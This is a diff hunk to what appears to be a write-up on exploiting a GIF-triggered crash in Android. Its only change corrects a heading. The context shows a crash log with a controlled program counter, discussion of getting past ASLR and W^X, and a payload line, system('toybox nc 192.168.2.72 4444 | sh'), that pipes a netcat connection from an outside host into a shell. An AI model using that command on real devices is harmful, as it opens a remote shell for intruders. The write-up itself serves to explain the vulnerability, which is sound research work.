@@ -229,7 +229,7 @@ The above GIF triggers crash as below:
 10-02 11:09:38.499 18071 18071 F DEBUG   :     #03 pc deadbeeefffffffc  <unknown>
 ```
 
-## Deal with ASLR and W^X
+## Dealing with ASLR and W^X
 After controlling the PC, we want to achieve remote code execution. In Android, we can not execute code on non-executable regions due to W^X (i.e. stack and heap). The easiest way to deal with W^X in our case is to execute the below command:
 ```
 system("toybox nc 192.168.2.72 4444 | sh");
